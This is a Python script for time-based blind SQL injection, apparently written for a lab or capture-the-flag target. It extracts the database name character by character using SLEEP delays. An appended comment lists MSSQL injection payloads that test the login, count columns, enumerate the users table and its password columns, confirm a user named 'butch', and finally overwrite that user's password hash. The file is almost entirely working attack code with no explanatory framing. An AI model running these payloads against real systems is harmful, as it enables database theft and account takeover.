import requests
import time

url = "http://target.local"
extracted_string = ""

for pos in range(1, 20): 
    low = 32   # Printable ASCII start (space)
    high = 126 # Printable ASCII end (~)
    
    while low <= high:
        mid = (low + high) // 2
        
        # Binary search payload: Adjust sleep time to 2-3 seconds to save time
        payload = f"1' AND (SELECT IF(ASCII(SUBSTRING((SELECT database()),{pos},1))>{mid},SLEEP(2),0))-- -"
        params = {"id": payload}
        
        start = time.time()
        try:
            requests.get(url, params=params, timeout=5)
        except requests.exceptions.Timeout:
            pass # Caught the sleep timeout
            
        duration = time.time() - start
        
        if duration >= 2: # If it slept, the character is higher than 'mid'
            low = mid + 1
        else:
            high = mid - 1
            
    if low > 126 or low == 32:
        break # No more printable characters found
        
    extracted_string += chr(low)
    print(f"[+] Found character at position {pos}: {chr(low)} -> Current string: {extracted_string}")

"""
Check first: ' OR 1=1 #' 
Count cols:  ' UNION ALL select 1, 2 -- , or just try ' UNION select * from table_name -- ' 
'; IF (1=2) WAITFOR DELAY '0:0:10';-- 
'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--
'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--
'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';-- 
"""
